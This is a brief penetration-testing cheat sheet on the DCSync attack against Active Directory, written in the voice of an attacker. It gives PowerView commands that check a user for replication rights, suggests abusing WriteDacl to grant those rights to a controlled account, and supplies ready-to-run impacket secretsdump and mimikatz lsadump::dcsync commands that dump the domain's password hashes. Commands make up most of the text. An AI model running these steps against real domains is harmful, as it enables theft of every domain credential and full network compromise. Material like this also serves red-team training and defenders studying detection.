DCSync attack is an attack that we utilize the credential of a privileged user to steal the AD password Database by using the Directory Replication Service Remote Protocol

Pre-requisite: We require a user that have Replicating Directory Changes and Replicating Directory Changes All permission (Default Groups to look for: Domain / Enterprise Admin, Default Domain Administrator)

-Confirm if a user have the respective rights with PowerView:
```
Get-DomainUser -Identity <username>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl #markdown object SID
```

-Perform ObjectAcl Check to confirm replication rights
```
$sid = <sidfrompreviousquery>
Get-ObjectAcl "DC=<domainname>,DC=<domainname>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

If we possess credential of someone with WriteDacl, we can add the required privilege to a user under our control

Extracting AD password Database using impacket-secretsdump:
```
secretsdump.py -outputfile <outputfilename> -just-dc <domain>/<username>@<dcip>
#Use -just-dc-ntlm for ntlm hash only, -just-dc-user to retrieve specific user
```

Extracting AD password Database using mimikatz:
```
.\mimikatz.exe
privilege::debug
log dcsync.txt
lsadump::dcsync /domain:<domainname> /user:<domain>\<username>
log /stop
```